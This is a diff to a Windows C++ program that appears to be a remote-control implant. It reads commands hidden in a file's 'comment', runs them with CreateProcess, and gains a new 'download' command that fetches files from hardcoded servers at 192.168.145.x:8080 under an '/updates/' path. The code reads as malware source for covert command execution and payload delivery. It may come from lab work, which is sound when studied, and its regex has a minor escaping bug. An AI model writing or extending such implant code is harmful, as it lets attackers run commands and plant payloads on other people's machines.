@@ -6,6 +6,8 @@
 #include <ctime>
 #include <fstream>
 #include <windows.h>
+#include <regex>  // Include regex header for pattern matching
+#include <vector>
 
 std::wstring tempCommand = L"";
 
@@ -43,9 +45,50 @@ std::wstring readCommentFromFile(const std::wstring& filePath) {
     return command;  // Return the command/comment read from the file
 }
 
+// Function to check if the command is a download command and parse it
+bool IsDownloadCommand(const std::wstring& command) {
+    std::wstring remoteUrl;
+    std::wstring localPath;
+    std::vector<std::wstring> remoteUrls = {
+        L"http://192.168.145.132:8080/updates/",
+        L"http://192.168.145.140:8080/updates/",
+    };
+
+    std::wregex downloadPattern(L"^download\\s+([^\s]+)\\s+\"?([^\"]+)\"?$");;
+    std::wsmatch matches;
+
+    // Match the command with the regex pattern
+    if (std::regex_match(command, matches, downloadPattern)) {
+        std::wstring fileName = matches[1].str();  // Extract the file name
+        localPath = matches[2].str();  // Extract the local path
+
+        // Attempt to construct the full remote URL by appending the filename to each base URL
+        // and try to download from each until one succeeds
+
+        for (const auto& url : remoteUrls) {
+            remoteUrl = url + fileName;  // Construct the full remote URL
+
+            // Attempt to download using this URL
+            std::wcout << L"Attempting to download from: " << remoteUrl << std::endl;
+
+            if (DownloadFile(remoteUrl, localPath)) {
+                std::wcout << L"Download started successfully from: " << remoteUrl << std::endl;
+                return true;  // Return true once a valid server is found and download starts
+            }
+        }
+
+        // If no server was successful
+        std::wcerr << L"All servers are down or unable to download the file." << std::endl;
+        return false;
+    }
+
+    return false;  // Return false if the command doesn't match the pattern
+}
+
+
 void ExecuteCommandFromFile(const std::wstring& localFile) {
     std::wstring command = readCommentFromFile(localFile);  // Read the command from file
-    std::wstring outputFile = L"output.txt";
+    /*std::wstring outputFile = L"output.txt";*/
     
 
     if (!command.empty()) {
@@ -56,6 +99,8 @@ void ExecuteCommandFromFile(const std::wstring& localFile) {
             STARTUPINFO si = { 0 };
             PROCESS_INFORMATION pi = { 0 };
             si.cb = sizeof(si);
+
+   			IsDownloadCommand(command);  // Check if the command is a download command
 
             // Modify the command to redirect both stdout and stderr to output.txt
             /*command.append(L" > ").append(outputFile).append(L" 2>&1");*/
